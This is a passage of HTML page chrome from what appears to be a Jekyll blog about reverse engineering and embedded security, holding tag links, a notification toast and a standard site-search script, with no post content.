rev</a> <a class="post-tag btn btn-outline-primary" href="/tags/embedded/">embedded</a> <a class="post-tag btn btn-outline-primary" href="/tags/angr/">angr</a> <a class="post-tag btn btn-outline-primary" href="/tags/aws/">aws</a> <a class="post-tag btn btn-outline-primary" href="/tags/badge/">badge</a> <a class="post-tag btn btn-outline-primary" href="/tags/chip-extraction/">chip extraction</a> <a class="post-tag btn btn-outline-primary" href="/tags/docker/">docker</a> <a class="post-tag btn btn-outline-primary" href="/tags/emulation/">emulation</a> <a class="post-tag btn btn-outline-primary" href="/tags/file-sim/">file-sim</a></div></section></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><aside aria-label="Scroll to Top"> <button id="back-to-top" type="button" class="btn btn-lg btn-box-shadow"> <i class="fas fa-angle-up"></i> </button></aside></div><div id="mask" class="d-none position-fixed w-100 h-100 z-1"></div><aside id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-bs-animation="true" data-bs-autohide="false" ><div class="toast-header"> <button type="button" class="btn-close ms-auto" data-bs-dismiss="toast" aria-label="Close" ></button></div><div class="toast-body text-center pt-0"><p class="px-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></aside><script> document.addEventListener('DOMContentLoaded', () => { SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<article class="px-1 px-sm-2 px-lg-4 px-xl-0"><header><h2><a href="{url}">{title}</a></h2><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div></header><p>{content}</p></article>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="me-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); }); </script>
